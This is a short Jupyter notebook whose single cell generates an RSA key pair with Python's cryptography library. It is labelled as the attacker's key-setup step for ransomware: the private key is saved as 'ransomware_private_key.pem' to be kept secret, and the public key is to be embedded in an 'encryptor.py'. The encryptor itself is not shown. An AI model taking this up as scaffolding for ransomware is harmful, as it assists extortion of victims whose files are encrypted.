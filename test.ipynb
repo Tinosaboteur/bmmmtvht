{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7aa7908",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!!! ATTACKER: Private key saved to 'ransomware_private_key.pem'. KEEP THIS SECRET !!!\n",
      "--- Public Key (to embed in encryptor.py) saved to 'public_key_to_embed.pem' ---\n",
      "-----BEGIN PUBLIC KEY-----\n",
      "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwgdy9Q5dsBrVso8AA10j\n",
      "UOFZ12xhRtIk0h07id53fDQmNl8jV6tCBUnr0g1pyT3KH4qJDrT/sC2DWCbp5adH\n",
      "Ylav2DuwZePXJb+Ai7XBakPnc/8001nNlgt1sW/JqNrf9/H1wyK0VcCJrpVttF2a\n",
      "H4cB6bGM8SoUb5Em+91kZg7VOGxA3U8eZ9BoljB5TYj5m1xN4YQPwsyIOkYIuwMY\n",
      "2GJ/ybKcc68hWzQEowxodQeGQXtx/8T0x1kHq7fRfz72wJlSMmylptJKu1L/ohi9\n",
      "FXCtugig2uLi60PVf/iUYcfJ6hEsAcpwkzopATQ3Ip5wbJZI5XgKZdr6QRQ/mydn\n",
      "+QIDAQAB\n",
      "-----END PUBLIC KEY-----\n",
      "\n",
      "---------------------------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "from cryptography.hazmat.primitives import serialization\n",
    "from cryptography.hazmat.primitives.asymmetric import rsa\n",
    "\n",
    "KEY_SIZE = 2048\n",
    "PUBLIC_EXPONENT = 65537\n",
    "PRIVATE_KEY_FILE = \"ransomware_private_key.pem\"\n",
    "PUBLIC_KEY_FILE_FOR_EMBEDDING = \"public_key_to_embed.pem\" \n",
    "\n",
    "# --- Tạo khóa ---\n",
    "private_key = rsa.generate_private_key(\n",
    "    public_exponent=PUBLIC_EXPONENT,\n",
    "    key_size=KEY_SIZE\n",
    ")\n",
    "public_key = private_key.public_key()\n",
    "\n",
    "# --- Lưu Private Key (Attacker giữ bí mật tuyệt đối) ---\n",
    "pem_private = private_key.private_bytes(\n",
    "    encoding=serialization.Encoding.PEM,\n",
    "    format=serialization.PrivateFormat.PKCS8,\n",
    "    encryption_algorithm=serialization.NoEncryption() \n",
    ")\n",
    "try:\n",
    "    with open(PRIVATE_KEY_FILE, \"wb\") as f:\n",
    "        f.write(pem_private)\n",
    "    print(f\"!!! ATTACKER: Private key saved to '{PRIVATE_KEY_FILE}'. KEEP THIS SECRET !!!\")\n",
    "except Exception as e:\n",
    "    print(f\"Error saving private key: {e}\")\n",
    "    exit()\n",
    "\n",
    "pem_public = public_key.public_bytes(\n",
    "    encoding=serialization.Encoding.PEM,\n",
    "    format=serialization.PublicFormat.SubjectPublicKeyInfo\n",
    ")\n",
    "try:\n",
    "    with open(PUBLIC_KEY_FILE_FOR_EMBEDDING, \"wb\") as f:\n",
    "        f.write(pem_public)\n",
    "    print(f\"--- Public Key (to embed in encryptor.py) saved to '{PUBLIC_KEY_FILE_FOR_EMBEDDING}' ---\")\n",
    "    print(pem_public.decode('utf-8')) \n",
    "    print(\"---------------------------------------------------------------------\")\n",
    "except Exception as e:\n",
    "    print(f\"Error saving public key: {e}\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
